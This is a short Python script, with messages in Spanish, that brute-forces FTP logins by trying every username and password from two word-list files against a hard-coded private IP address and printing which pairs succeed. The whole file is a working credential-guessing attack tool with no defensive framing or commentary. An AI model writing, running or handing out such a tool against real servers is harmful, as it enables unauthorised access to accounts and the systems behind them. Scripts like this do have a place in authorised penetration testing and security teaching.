
import sys

from ftplib import FTP


ftp = FTP()

def bruteforce(target,user,password):
	ftp=FTP(target)
	
	try:
		ftp.login(user,password)
		print('(+) Se encontro las credenciales =>{}:{}'.format(user,password))
		
	except:
		print('(+) Fallo las credenciales =>{}:{}'.format(user,password))

	

def main():
	target= "192.168.1.133"
	users=open('users.txt','r')
	users=users.read().split('\n')
	passwords=open('pass.txt','r')
	passwords=passwords.read().split('\n')

	for user in users:
		for password in passwords:
			bruteforce(target,user,password)
			

if __name__=='__main__':
	try:
		main()
	except KeyboardInterrupt:
		sys.exit()
